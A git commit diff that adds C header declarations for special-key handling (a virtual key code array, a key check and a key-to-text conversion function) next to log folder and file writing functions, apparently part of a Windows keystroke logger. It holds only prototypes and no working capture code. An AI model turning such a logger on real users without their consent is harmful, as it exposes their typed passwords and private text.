4d11abf5620b9439916e1f2fd079ae1721d1835c
WanisC <wanischouaib1@gmail.com>
2025-04-07 19:38:33 +0200

    Adding keys functions to file (only Windows support)

--- src/writing/file.h
+++ src/writing/file.h
@@ -1,5 +1,15 @@
 #include <stdio.h>
 
+// Virtual key codes for special keys
+/* http://kbdedit.com/manual/low_level_vk_list.html */
+extern int specialKeys[];
+
+// Special keys functions
+int CheckSpecialKey(int data);
+char* SpecialKeyToReadable(int data);
+
+
+// File writing functions
 int CheckLogFolder(const char *chemin);
 void CreateLogFolder(const char *chemin);
 void WriteIntoFile(char data, const char* filePath);
